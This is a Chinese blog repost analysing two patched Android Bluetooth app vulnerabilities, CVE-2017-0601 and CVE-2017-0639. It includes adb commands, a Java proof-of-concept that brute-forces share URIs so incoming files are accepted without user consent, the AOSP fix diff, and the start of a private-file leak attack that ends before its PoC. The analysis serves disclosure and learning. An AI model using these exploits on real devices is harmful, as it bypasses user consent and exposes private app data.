<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="作者: heeeeen 本文系转载，目的是学习，如有侵权，请联系删除 转载出处:http:&#x2F;&#x2F;www.ms509.com&#x2F;  蓝牙App漏洞系列分析之一CVE-2017-06010x01 概要2017年5月的Android安全公告修复了我们提交的一个蓝牙提权中危漏洞，这个漏洞尽管简单，但比较有意思，能够使本地恶意App绕过用户交互，使用户强制接收外部传入的蓝牙文件。漏洞概要如下： CVE: CV">
<meta property="og:type" content="article">
<meta property="og:title" content="蓝牙App系列漏洞原理分析与漏洞利用">
<meta property="og:url" content="http://example.com/2018/10/01/%E8%93%9D%E7%89%99App%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="Tasfa&#39;s World!">
<meta property="og:description" content="作者: heeeeen 本文系转载，目的是学习，如有侵权，请联系删除 转载出处:http:&#x2F;&#x2F;www.ms509.com&#x2F;  蓝牙App漏洞系列分析之一CVE-2017-06010x01 概要2017年5月的Android安全公告修复了我们提交的一个蓝牙提权中危漏洞，这个漏洞尽管简单，但比较有意思，能够使本地恶意App绕过用户交互，使用户强制接收外部传入的蓝牙文件。漏洞概要如下： CVE: CV">
<meta property="og:locale">
<meta property="article:published_time" content="2018-10-01T01:49:25.000Z">
<meta property="article:modified_time" content="2021-05-22T13:10:54.208Z">
<meta property="article:author" content="Tasfa">
<meta property="article:tag" content="Android漏洞">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2018/10/01/%E8%93%9D%E7%89%99App%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh'
  };
</script>

  <title>蓝牙App系列漏洞原理分析与漏洞利用 | Tasfa's World!</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="Tasfa's World!" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Tasfa's World!</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Try to Debug your heart!</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2018/10/01/%E8%93%9D%E7%89%99App%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Tasfa">
      <meta itemprop="description" content="AndroidSecurity">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tasfa's World!">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          蓝牙App系列漏洞原理分析与漏洞利用
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2018-10-01 09:49:25" itemprop="dateCreated datePublished" datetime="2018-10-01T09:49:25+08:00">2018-10-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-22 21:10:54" itemprop="dateModified" datetime="2021-05-22T21:10:54+08:00">2021-05-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Android安全</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Android%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">漏洞分析</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <blockquote>
<p>作者: heeeeen</p>
<p>本文系转载，目的是学习，如有侵权，请联系删除</p>
<p>转载出处:<a target="_blank" rel="noopener" href="http://www.ms509.com/">http://www.ms509.com/</a></p>
</blockquote>
<h2 id="蓝牙App漏洞系列分析之一CVE-2017-0601"><a href="#蓝牙App漏洞系列分析之一CVE-2017-0601" class="headerlink" title="蓝牙App漏洞系列分析之一CVE-2017-0601"></a>蓝牙App漏洞系列分析之一CVE-2017-0601</h2><h3 id="0x01-概要"><a href="#0x01-概要" class="headerlink" title="0x01 概要"></a>0x01 概要</h3><p>2017年5月的Android安全公告修复了我们提交的一个蓝牙提权中危漏洞，这个漏洞尽管简单，但比较有意思，能够使本地恶意App绕过用户交互，使用户强制接收外部传入的蓝牙文件。漏洞概要如下：</p>
<pre><code>CVE: CVE-2017-0601
BugID: A-35258579
严重性: 中
影响的Google设备: All
Updated AOSP versions: 7.0, 7.1.1, 7.1.2
</code></pre>
<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>蓝牙App暴露了一个广播接收器com.android.bluetooth.opp.BluetoothOppReceiver，本地普通App可以向这个Receiver发送广播，查看其OnReceive方法，包含了对多种传入广播Intent Action的处理，但是大多数Intent Action处于保护状态，简单用adb shell可以一一对其测试，比如</p>
<span id="more"></span>

<blockquote>
<p>adb shell am broadcast -a android.btopp.intent.action.OPEN</p>
</blockquote>
<p>提示如下错误，说明action处于保护状态</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Broadcasting: Intent &#123; act=android.btopp.intent.action.OPEN &#125;</span><br><span class="line">java.lang.SecurityException: Permission Denial: not allowed to send broadcast android.btopp.intent.action.OPEN from pid=26382, uid=2000</span><br><span class="line">     at android.os.Parcel.readException(Parcel.java:1683)</span><br><span class="line">     at android.os.Parcel.readException(Parcel.java:1636)</span><br><span class="line">     at android.app.ActivityManagerProxy.broadcastIntent(ActivityManagerNative.java:3507)</span><br><span class="line">     at com.android.commands.am.Am.sendBroadcast(Am.java:772)</span><br><span class="line">     at com.android.commands.am.Am.onRun(Am.java:404)</span><br><span class="line">     at com.android.internal.os.BaseCommand.run(BaseCommand.java:51)</span><br><span class="line">     at com.android.commands.am.Am.main(Am.java:121)</span><br><span class="line">     at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)</span><br><span class="line">     at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:262)</span><br></pre></td></tr></table></figure>

<p>但是android.btopp.intent.action.ACCEPT这个Intent Action，却没有保护</p>
<blockquote>
<p>adb shell am broadcast -a  android.btopp.intent.action.ACCEPT</p>
</blockquote>
<p>Broadcasting: Intent { act=android.btopp.intent.action.ACCEPT }<br>Broadcast completed: result=0</p>
<p>进一步分析AOSP代码，发现传入这个Action的Intent时，会将Intent携带Uri指向的db进行更新，更新为用户确认状态。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (action.equals(Constants.ACTION_ACCEPT)) &#123;</span><br><span class="line">           <span class="keyword">if</span> (V) Log.v(TAG, <span class="string">&quot;Receiver ACTION_ACCEPT&quot;</span>);</span><br><span class="line">           Uri uri = intent.getData();</span><br><span class="line">           ContentValues values = <span class="keyword">new</span> ContentValues();</span><br><span class="line">           values.put(BluetoothShare.USER_CONFIRMATION, BluetoothShare.USER_CONFIRMATION_CONFIRMED);</span><br><span class="line">           context.getContentResolver().update(uri, values, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">           cancelNotification(context, uri);</span><br></pre></td></tr></table></figure>
<p>这个db其实就是蓝牙文件共享的provider，对应的uri为content://con.android.bluetooth.opp/btopp，当通过蓝牙共享接收、发送文件时，该数据库都会增加新的条目，记录接收、发送的状态。该provider记录的信息可以参考BluetoothShare</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Exposes constants used to interact with the Bluetooth Share manager&#x27;s content</span></span><br><span class="line"><span class="comment">* provider.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@hide</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">BluetoothShare</span> <span class="keyword">implements</span> <span class="title">BaseColumns</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">BluetoothShare</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The permission to access the Bluetooth Share Manager</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PERMISSION_ACCESS = <span class="string">&quot;android.permission.ACCESS_BLUETOOTH_SHARE&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The content:// URI for the data table in the provider</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Uri CONTENT_URI = Uri.parse(<span class="string">&quot;content://com.android.bluetooth.opp/btopp&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>因此，如果我们在Intent中传入某个蓝牙共享对应文件的uri，那么它在蓝牙文件共享Provider中的状态就会被更改为用户确认状态。这里继续进行猜想，进一步，如果我们刚好通过蓝牙传入某个文件，将其状态改为用户确认，是否文件就无需确认，自动接收了呢？幸运的是，的确如此。</p>
<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>这里还有一个问题要解决，content://com.android.bluetooth.opp/btopp只是整个provider的uri，我们如何知道刚刚通过蓝牙传入文件的uri呢？通过暴力穷举，下面的PoC简单地解决了这个问题，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    Button m_btnAccept = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String ACTION_ACCEPT = <span class="string">&quot;android.btopp.intent.action.ACCEPT&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String BLUETOOTH_SHARE_URI = <span class="string">&quot;content://com.android.bluetooth.opp/btopp/&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        m_btnAccept = (Button)findViewById(R.id.accept);</span><br><span class="line">        m_btnAccept.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">                intent.setComponent(<span class="keyword">new</span> ComponentName(<span class="string">&quot;com.android.bluetooth&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;com.android.bluetooth.opp.BluetoothOppReceiver&quot;</span>));</span><br><span class="line">                intent.setAction(ACTION_ACCEPT);</span><br><span class="line">                <span class="comment">// Guess the incoming bluetooth share uri, normally it increases from 1 by 1 and could be guessed easily.</span></span><br><span class="line">                <span class="comment">// Then Send broadcast to change the incoming file status</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">255</span>; i++) &#123;</span><br><span class="line">                    String uriString = BLUETOOTH_SHARE_URI + Integer.toString(i);</span><br><span class="line">                    intent.setData(Uri.parse(uriString));</span><br><span class="line">                    sendBroadcast(intent);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x04-测试方法"><a href="#0x04-测试方法" class="headerlink" title="0x04 测试方法"></a>0x04 测试方法</h3><p>通过蓝牙向测试手机发送文件，此时，手机将会出现提示，要用户拒绝或者接受，这个对话框将会出现约1分钟</p>
<p>Bluetooth Transfer PendingBluetooth Transfer Pending</p>
<p>此时运行POC，文件将会自动接收，因此这是一个本地用户交互绕过。如果有恶意程序利用该漏洞一直在后台运行，那么手机将会被强制接收任意蓝牙传入的文件。</p>
<h3 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h3><p>Google在Framework的AndroidManifest文件中，将android.btopp.intent.action.ACCEPT和DELINE设为保护状态，普通App无法发出携带这些action的Intent</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/core/res/AndroidManifest.xml b/core/res/AndroidManifest.xml</span><br><span class="line">index ec712bb..011884c 100644</span><br><span class="line">--- a/core/res/AndroidManifest.xml</span><br><span class="line">+++ b/core/res/AndroidManifest.xml</span><br><span class="line">@@ -199,6 +199,8 @@</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.OPEN_INBOUND&quot; /&gt;    </span><br><span class="line">     &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.TRANSFER_COMPLETE&quot; /&gt;</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.gatt.REFRESH_BATCHED_SCAN&quot; /&gt;</span><br><span class="line">+    &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.ACCEPT&quot; /&gt;</span><br><span class="line">+    &lt;protected-broadcast android:name=&quot;android.btopp.intent.action.DECLINE&quot; /&gt;</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.authchall&quot; /&gt;</span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.userconfirmtimeout&quot; /&gt;  </span><br><span class="line">     &lt;protected-broadcast android:name=&quot;com.android.bluetooth.pbap.authresponse&quot; /&gt;</span><br></pre></td></tr></table></figure>

<h3 id="0x06-时间线"><a href="#0x06-时间线" class="headerlink" title="0x06 时间线"></a>0x06 时间线</h3><pre><code>2017.02.09——提交Google
2017.03.01——漏洞确认
2017.05.01——补丁发布
2017.05.04——漏洞公开
</code></pre>
<h2 id="蓝牙App漏洞系列分析之二CVE-2017-0639"><a href="#蓝牙App漏洞系列分析之二CVE-2017-0639" class="headerlink" title="蓝牙App漏洞系列分析之二CVE-2017-0639"></a>蓝牙App漏洞系列分析之二CVE-2017-0639</h2><h3 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h3><p>Android本月的安全公告，修复了我们发现的另一个蓝牙App信息泄露漏洞，该漏洞允许攻击者获取 bluetooth用户所拥有的私有文件，绕过了将应用数据与其他应用隔离的操作系统防护功能。</p>
<p>漏洞信息如下：</p>
<pre><code>CVE: CVE-2017-0639
BugID: A-35310991
严重性: 高危
漏洞类型: 信息泄露
Updated AOSP versions: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2
</code></pre>
<h3 id="0x02-漏洞缘起"><a href="#0x02-漏洞缘起" class="headerlink" title="0x02 漏洞缘起"></a>0x02 漏洞缘起</h3><p>在发现这个漏洞之前，我浏览了Android 2017年2月的安全公告，其中两个并排的高危信息泄露漏洞引起了我的注意：</p>
<pre><code>CVE-2017-0420: AOSP邮件中的信息泄露漏洞
CVE-2017-0414: AOSP短信中的信息泄露漏洞
</code></pre>
<p>查看这两个信息漏洞的补丁注释，分别为</p>
<pre><code>Don’t allow file attachment from /data through GET_CONTENT
Thirdparty can
attach private files from “/data/data/com.android.messaging/“
directory to the messaging app。
</code></pre>
<p>涵义非常清晰，似乎邮件和短信App均遗漏了对发送的文件进行验证，本地攻击者可以添加App私有目录的数据文件发送出去，从而破坏了Android沙箱所提供的应用数据相互隔离的安全防护功能。</p>
<p>这两个漏洞可以归纳为一类针对具有对外发送或共享功能App的攻击，Android中会不会还有类似的功能具有类似的漏洞？另外，注意到上述两个漏洞的发现者并非一人，只是巧合地同时出现在2月份的安全公告之中，发现者似乎还没有意识到这类攻击的通用性，也许真的还没有搜刮干净？</p>
<h3 id="0x03-攻击面——蓝牙的信息分享"><a href="#0x03-攻击面——蓝牙的信息分享" class="headerlink" title="0x03 攻击面——蓝牙的信息分享"></a>0x03 攻击面——蓝牙的信息分享</h3><p>除了短信、邮件，很容易想到蓝牙也是Android一个很重要的信息对外发送出口。通常，我们选择一个文件的分享按钮，选择蓝牙，就可以触发蓝牙的文件发送功能，这是通过蓝牙App暴露的BluetoothOppLauncherActivity所实现。该Activity根据传入的Intent.ACTION_SEND或<br>Intent.ACTION_SEND_MULTIPLE，启动一个线程处理单个文件或多个文件的对外发送。主要代码如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  * Other application is trying to share a file via Bluetooth,</span></span><br><span class="line"><span class="comment">  * probably Pictures, videos, or vCards. The Intent should contain</span></span><br><span class="line"><span class="comment">  * an EXTRA_STREAM with the data to attach.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">if</span> (action.equals(Intent.ACTION_SEND)) &#123;</span><br><span class="line">     <span class="comment">// <span class="doctag">TODO:</span> handle type == null case</span></span><br><span class="line">     <span class="keyword">final</span> String type = intent.getType();</span><br><span class="line">     <span class="keyword">final</span> Uri stream = (Uri)intent.getParcelableExtra(Intent.EXTRA_STREAM);</span><br><span class="line">     CharSequence extra_text = intent.getCharSequenceExtra(Intent.EXTRA_TEXT);</span><br><span class="line">     <span class="comment">// If we get ACTION_SEND intent with EXTRA_STREAM, we&#x27;ll use the</span></span><br><span class="line">     <span class="comment">// uri data;</span></span><br><span class="line">     <span class="comment">// If we get ACTION_SEND intent without EXTRA_STREAM, but with</span></span><br><span class="line">     <span class="comment">// EXTRA_TEXT, we will try send this TEXT out; Currently in</span></span><br><span class="line">     <span class="comment">// Browser, share one link goes to this case;</span></span><br><span class="line">     <span class="keyword">if</span> (stream != <span class="keyword">null</span> &amp;&amp; type != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (V) Log.v(TAG, <span class="string">&quot;Get ACTION_SEND intent: Uri = &quot;</span> + stream + <span class="string">&quot;; mimetype = &quot;</span></span><br><span class="line">                     + type);</span><br><span class="line">         <span class="comment">// Save type/stream, will be used when adding transfer</span></span><br><span class="line">         <span class="comment">// session to DB.</span></span><br><span class="line">         Thread t = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                 BluetoothOppManager.getInstance(BluetoothOppLauncherActivity.<span class="keyword">this</span>)</span><br><span class="line">                     .saveSendingFileInfo(type,stream.toString(), <span class="keyword">false</span>);</span><br><span class="line">                 <span class="comment">//Done getting file info..Launch device picker and finish this activity</span></span><br><span class="line">                     launchDevicePicker();</span><br><span class="line">                     finish();</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;);</span><br><span class="line">             t.start();</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             Log.w(TAG,<span class="string">&quot;Error trying to do set text...File not created!&quot;</span>);</span><br><span class="line">             finish();</span><br><span class="line">             <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         Log.e(TAG, <span class="string">&quot;type is null; or sending file URI is null&quot;</span>);</span><br><span class="line">         finish();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125; <span class="keyword">else</span> <span class="keyword">if</span> (action.equals(Intent.ACTION_SEND_MULTIPLE)) &#123;</span><br><span class="line">     <span class="keyword">final</span> String mimeType = intent.getType();</span><br><span class="line">     <span class="keyword">final</span> ArrayList&lt;Uri&gt; uris = intent.getParcelableArrayListExtra(Intent.EXTRA_STREAM);</span><br><span class="line">     <span class="keyword">if</span> (mimeType != <span class="keyword">null</span> &amp;&amp; uris != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (V) Log.v(TAG, <span class="string">&quot;Get ACTION_SHARE_MULTIPLE intent: uris &quot;</span> + uris + <span class="string">&quot;\n Type= &quot;</span></span><br><span class="line">                     + mimeType);</span><br><span class="line">         Thread t = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">             <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                 BluetoothOppManager.getInstance(BluetoothOppLauncherActivity.<span class="keyword">this</span>)</span><br><span class="line">                     .saveSendingFileInfo(mimeType,uris, <span class="keyword">false</span>);</span><br><span class="line">                 <span class="comment">//Done getting file info..Launch device picker</span></span><br><span class="line">                 <span class="comment">//and finish this activity</span></span><br><span class="line">                 launchDevicePicker();</span><br><span class="line">                 finish();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         t.start();</span><br></pre></td></tr></table></figure>

<p>那么，传入蓝牙App私有数据试试！先寻找bluetooth所拥有的私有文件，</p>
<blockquote>
<p>angler:/ # find /data -user bluetooth -exec ls -al {} ; 2&gt; /dev/null</p>
</blockquote>
<p>可以选定两个bluetooth所拥有、有实质内容的文件作为发送对象，file:///data/user_de/0/com.android.bluetooth/databases/btopp.db和file:///data/misc/bluedroid/bt_config.conf</p>
<p>很快可以写出PoC</p>
